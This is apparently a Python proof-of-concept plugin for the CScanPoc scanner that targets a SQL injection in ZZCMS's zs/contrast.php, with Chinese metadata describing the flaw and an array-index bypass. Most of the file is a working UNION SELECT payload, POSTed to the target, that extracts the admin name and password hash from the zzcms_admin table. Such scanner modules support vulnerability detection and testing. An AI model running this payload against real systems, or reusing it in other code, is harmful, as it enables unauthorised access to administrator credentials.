# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'ZZCMS_0001'  # 平台漏洞编号，留空
    name = 'ZZCMS SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-10-07'  # 漏洞公布时间
    desc = '''
        ZZCMS是一款集成app移动平台与电子商务平台的内容管理系统。
        文件位置:zs/contrast.php
        POST过来的id字段一个字一个字分开然后用”,”连接(我也不知道为什么这个程序员把”.=”写成了”=” 导致了”123”变成”1,” 原本应为”1,2,3,”)去掉最后的”,”后不经过任何过滤扔进sql语句里
        其实绕过这个substr很简单 只需要提交的时候加一个数组的下标就可以了。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/4082/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ZZCMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'fdf08a1c-287f-4869-ab45-6ec58a684d3a'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/zs/contrast.php'
            data = "id[0]=1)union select 1,CONCAT(0x73,0x71,0x6c,0x49,0x6e,0x6a,0x65,0x63,0x74,0x46,0x6c,0x61,0x67,0x5b,0x23,admin,0x7c,md5(c),0x23,0x5d,0x73,0x71,0x6c,0x49,0x6e,0x6a,0x65,0x63,0x74,0x46,0x6c,0x61,0x67),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1, NULL,1,1,1,1,1,1,1,1,1,1,1,1, NULL,1,1,1,1,1,1,1 from zzcms_admin#"
            url = self.target + payload
            r = requests.post(url, data=data)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
